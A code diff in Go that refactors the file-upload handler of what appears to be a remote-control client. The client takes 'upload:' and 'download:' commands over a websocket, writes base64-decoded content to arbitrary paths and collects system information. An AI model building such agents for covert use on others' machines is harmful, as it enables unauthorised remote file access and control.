@@ -162,6 +162,37 @@ func (e *ExecuteCommand) change_directory(directory string) string {
 	return "Directory changed successfully"
 }
 
+// 上传文件
+func (e *ExecuteCommand) upload_file(file_path string, contents string) string {
+	message := "ok"
+	if contents == "" {
+		// Create a new file and close it
+		file, err := os.Create(file_path)
+		file.Write([]byte(""))
+		if err != nil {
+			message = err.Error()
+		} else {
+			file.Close()
+		}
+	} else {
+		// Open or create the file with write permissions
+		file, err := os.OpenFile(file_path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+		if err != nil {
+			message = err.Error()
+		} else {
+			// Decode base64 encoded content
+			decoded_content, err := base64.StdEncoding.DecodeString(contents)
+			if err != nil {
+				message = err.Error()
+			} else if _, err := file.Write(decoded_content); err != nil {
+				message = err.Error()
+			}
+			defer file.Close()
+		}
+	}
+	return message
+}
+
 // 获取系统信息
 func get_system_info() string {
 	hostInfo, err := host.Info()
@@ -261,47 +292,15 @@ func client_loop() {
 				}
 			} else if strings.HasPrefix(command, "upload:") {
 				// 上传文件
-				message := "ok"
 				upload_file_info := command[len("upload:"):]
 				file_parts := strings.SplitN(upload_file_info, "(*.*)", 2)
-				if err != nil {
-					message = err.Error()
-				} else {
-					if file_parts[1] == "" {
-						file_name := file_parts[0]
-						// Create a new file and close it
-						file, err := os.Create(file_name)
-						file.Write([]byte(""))
-						if err != nil {
-							message = err.Error()
-						} else {
-							file.Close()
-						}
-					} else {
-						file_path := file_parts[0]
-						// Open or create the file with write permissions
-						file, err := os.OpenFile(file_path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
-						if err != nil {
-							message = err.Error()
-						} else {
-							content := file_parts[1]
-							// Decode base64 encoded content
-							decoded_content, err := base64.StdEncoding.DecodeString(content)
-							if err != nil {
-								message = err.Error()
-							} else if _, err := file.Write(decoded_content); err != nil {
-								message = err.Error()
-							}
-							defer file.Close()
-						}
-					}
-				}
+				message := Executecommand.upload_file(file_parts[0], file_parts[1])
 				if err := conn.WriteMessage(websocket.TextMessage, []byte(message)); err != nil {
 					conn.Close()
 					break
 				}
 			} else if strings.HasPrefix(command, "download:") {
-			    // 下载文件
+				// 下载文件
 				message := "finish:zhaobokai"
 				file_path := command[len("download:"):]
 				file, err := os.Open(file_path)
